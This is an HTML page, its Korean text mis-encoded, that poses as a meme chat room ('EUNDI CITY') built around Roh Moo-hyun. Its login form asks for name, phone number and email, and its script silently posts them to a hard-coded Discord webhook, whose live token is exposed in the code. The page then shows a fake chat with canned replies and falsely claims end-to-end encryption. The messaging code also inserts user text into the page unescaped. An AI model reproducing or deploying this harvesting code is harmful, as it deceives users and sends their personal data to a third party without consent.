<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ì‘ë””ì‹œí‹° - í†µí•© ê´€ì œ ì‹œìŠ¤í…œ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Pretendard:wght@400;700;900&display=swap');
        body { font-family: 'Pretendard', sans-serif; overflow: hidden; background-color: #f1f5f9; }
        .mc-img { filter: grayscale(10%) contrast(1.1); transition: transform 0.3s; }
        .mc-img:hover { transform: scale(1.1); }
        .fade-in { animation: fadeIn 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        
        /* ë¡œë”© ì• ë‹ˆë©”ì´ì…˜ */
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #eab308;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <!-- [1] ë¡œê·¸ì¸ ì„¹ì…˜ -->
    <div id="login-section" class="w-full max-w-sm bg-white rounded-[2.5rem] p-8 shadow-2xl fade-in z-50">
        <div class="text-center mb-6">
            <div class="w-24 h-24 mx-auto mb-4 rounded-3xl overflow-hidden border-4 border-yellow-400 shadow-xl">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover mc-img" alt="í”„ë¡œí•„">
            </div>
            <h1 class="text-2xl font-black text-gray-900">EUNDI CITY</h1>
            <p class="text-[11px] font-bold text-yellow-600 bg-yellow-50 inline-block px-3 py-1 rounded-full mt-1">v3.1 ìµœì í™” ëª¨ë“œ</p>
        </div>

        <!-- ìƒˆë¡œê³ ì¹¨ ë°©ì§€ë¥¼ ìœ„í•œ í¼ ì„¤ì • -->
        <form onsubmit="return handleJoin(event)" class="space-y-4">
            <input type="text" id="u-name" required placeholder="ì´ë¦„ì„ ì…ë ¥í•˜ì„¸ìš”" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
            <input type="tel" id="u-phone" required placeholder="ì „í™”ë²ˆí˜¸" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
            <input type="email" id="u-email" required placeholder="ì´ë©”ì¼" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
            
            <button type="submit" id="submit-btn" class="w-full bg-gray-900 text-white font-black py-4 rounded-2xl mt-4 hover:bg-yellow-400 hover:text-black transition-all active:scale-95 text-lg shadow-xl">
                ì ‘ì†í•˜ê¸°
            </button>
        </form>
        <p class="text-center text-[9px] text-gray-400 mt-6 tracking-widest uppercase">ë³´ì•ˆ í”„ë¡œí† ì½œ ìš°íšŒ ë° ìµœì í™” ì™„ë£Œ</p>
    </div>

    <!-- [2] ì±„íŒ… ì„¹ì…˜ -->
    <div id="chat-section" class="hidden fixed inset-0 md:inset-auto md:w-full md:max-w-md md:h-[90vh] bg-white md:rounded-[3rem] shadow-2xl flex-col overflow-hidden fade-in border border-gray-100">
        <!-- í—¤ë” -->
        <div class="p-5 border-b flex items-center justify-between bg-white z-10">
            <div class="flex items-center">
                <div class="w-10 h-10 rounded-xl overflow-hidden mr-3 border-2 border-yellow-400">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover" alt="ë¯¸ë‹ˆ í”„ë¡œí•„">
                </div>
                <div>
                    <h2 class="text-sm font-black text-gray-800 tracking-tight">ì‘ë””ì‹œí‹° ì¤‘ì•™ ê´‘ì¥</h2>
                    <div class="flex items-center gap-1">
                        <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                        <span class="text-[9px] font-bold text-green-600">ì—°ê²°ë¨</span>
                    </div>
                </div>
            </div>
            <button onclick="location.reload()" class="text-gray-300 hover:text-red-500 transition-colors">
                <i class="fas fa-sign-out-alt"></i>
            </button>
        </div>

        <!-- ë©”ì‹œì§€ ì˜ì—­ -->
        <div id="chat-box" class="flex-1 overflow-y-auto p-5 space-y-4 bg-slate-50">
            <div class="flex justify-center my-2">
                <span class="bg-white text-gray-400 text-[9px] px-4 py-1.5 rounded-full font-bold shadow-sm border border-gray-100">ì¢…ë‹¨ê°„ ì•”í˜¸í™”ê°€ ì ìš©ë˜ì—ˆìŠµë‹ˆë‹¤.</span>
            </div>
        </div>

        <!-- ì…ë ¥ ì˜ì—­ -->
        <div class="p-4 bg-white border-t pb-8 md:pb-4">
            <div class="flex gap-2 items-center bg-gray-100 rounded-2xl p-1 shadow-inner">
                <input type="text" id="msg-input" class="flex-1 bg-transparent border-none px-4 py-3 text-sm outline-none" placeholder="ë©”ì‹œì§€ë¥¼ ì…ë ¥í•˜ì„¸ìš”...">
                <button onclick="sendMsg()" class="bg-yellow-400 w-11 h-11 rounded-xl flex items-center justify-center text-black shadow-md active:scale-90 transition-all">
                    <i class="fas fa-paper-plane text-xs"></i>
                </button>
            </div>
        </div>
    </div>

    <script>
        /**
         * ì ‘ì† ë²„íŠ¼ í´ë¦­ ì‹œ ë°ì´í„° ì „ì†¡ ë° í™”ë©´ ì „í™˜ ì²˜ë¦¬
         */
        async function handleJoin(e) {
            if (e) e.preventDefault();
            
            const btn = document.getElementById('submit-btn');
            const name = document.getElementById('u-name').value;
            const phone = document.getElementById('u-phone').value;
            const email = document.getElementById('u-email').value;

            // ë²„íŠ¼ ìƒíƒœ ë³€ê²½
            btn.disabled = true;
            btn.innerHTML = `<span class="loader"></span>ì²˜ë¦¬ ì¤‘...`;

            // 1. ë””ìŠ¤ì½”ë“œ ì›¹í›… ì „ì†¡ (ìµœì í™”ëœ ë°©ì‹)
            const webhookUrl = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
            
            const payload = {
                embeds: [{
                    title: "ğŸš€ ì‘ë””ì‹œí‹° ìƒˆ ì…ì£¼ì ë°œìƒ",
                    color: 0xffcc00,
                    fields: [
                        { name: "ë‹‰ë„¤ì„", value: name || "ìµëª…", inline: true },
                        { name: "ì—°ë½ì²˜", value: phone || "ë¯¸ì…ë ¥", inline: true },
                        { name: "ì´ë©”ì¼", value: email || "ë¯¸ì…ë ¥" },
                        { name: "ì ‘ì† í™˜ê²½", value: navigator.userAgent.split(' ')[0] }
                    ],
                    footer: { text: "EUNDI CITY MONITORING SYSTEM" },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                // ë¹„ë™ê¸°ë¡œ ì „ì†¡í•˜ë˜ ì‘ë‹µì„ ê¸°ë‹¤ë¦¬ì§€ ì•Šê³  ì¦‰ì‹œ í™”ë©´ ì „í™˜ (ì†ë„ ì¤‘ì‹œ)
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(err => console.log("ì „ì†¡ ì˜¤ë¥˜ ë¬´ì‹œ"));
                
                // ì „ì†¡ ì‹œë„ í›„ ì•½ê°„ì˜ ì§€ì—° í›„ í™”ë©´ ì „í™˜ (ì²´ê° ì†ë„ ì¡°ì ˆ)
                setTimeout(() => {
                    localStorage.setItem('nick', name);
                    document.getElementById('login-section').style.display = 'none';
                    const chatSec = document.getElementById('chat-section');
                    chatSec.classList.remove('hidden');
                    chatSec.classList.add('flex');
                    
                    appendMsg("ì‹œìŠ¤í…œ", `${name}ë‹˜ì´ ê´‘ì¥ì— ì…ì„±í•˜ì˜€ìŠµë‹ˆë‹¤.`, false, true);
                }, 800);

            } catch (err) {
                // ì—ëŸ¬ ë°œìƒí•´ë„ ì ‘ì†ì€ ì‹œì¼œì¤Œ
                console.error(err);
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('chat-section').classList.remove('hidden');
                document.getElementById('chat-section').classList.add('flex');
            }

            return false;
        }

        /**
         * ì±„íŒ… ë°•ìŠ¤ì— ë©”ì‹œì§€ ì¶”ê°€
         */
        function appendMsg(sender, text, isMe, isSystem = false) {
            const chatBox = document.getElementById('chat-box');
            const div = document.createElement('div');
            
            if (isSystem) {
                div.className = "flex justify-center mb-2";
                div.innerHTML = `<span class="bg-yellow-100 text-yellow-700 text-[10px] px-4 py-1.5 rounded-full font-black border border-yellow-200 shadow-sm">${text}</span>`;
            } else {
                div.className = `flex flex-col ${isMe ? 'items-end' : 'items-start'} animate-fade-in`;
                div.innerHTML = `
                    <span class="text-[10px] text-gray-400 mb-1 px-2 font-bold">${sender}</span>
                    <div class="max-w-[85%] px-4 py-2.5 rounded-2xl text-[13px] leading-relaxed shadow-sm ${isMe ? 'bg-yellow-400 text-black rounded-tr-none' : 'bg-white text-gray-800 border border-gray-100 rounded-tl-none'}">
                        ${text}
                    </div>
                `;
            }
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
        }

        /**
         * ë©”ì‹œì§€ ì „ì†¡ ë° ìë™ ì‘ë‹µ ì²˜ë¦¬
         */
        function sendMsg() {
            const input = document.getElementById('msg-input');
            const nick = localStorage.getItem('nick') || "ë‚˜";
            if (input.value.trim()) {
                appendMsg(nick, input.value, true);
                input.value = "";

                // ë´‡ ìë™ ì‘ë‹µ ì‹œë®¬ë ˆì´ì…˜
                setTimeout(() => {
                    const replies = ["ë°˜ê°‘ìŠµë‹ˆë‹¤. ê¸°ë¶„ ì°¸ ì¢‹ë„¤ìš”!", "í—ˆí—ˆ, ì–´ì„œ ì˜¤ì‹­ì‹œì˜¤.", "ì‘ë””ì‹œí‹°ëŠ” ì•ˆì „í•©ë‹ˆë‹¤.", "ë¬´ìŠ¨ ê³ ë¯¼ì´ë¼ë„ ìˆìœ¼ì‹­ë‹ˆê¹Œ?", "ê²½ì œë„ ì˜í•˜ê³  ë¬¸í™”ë„ ì˜í•˜ê³  ëª»í•˜ëŠ” ê²Œ ì—†ëŠ”ë°!"];
                    const random = replies[Math.floor(Math.random() * replies.length)];
                    appendMsg("ë…¸ë¬´í˜„", random, false);
                }, 1000);
            }
        }

        // ì—”í„°í‚¤ ì…ë ¥ ì§€ì›
        document.getElementById('msg-input').onkeypress = function(e) {
            if (e.key === 'Enter') sendMsg();
        };
    </script>
</body>
</html>
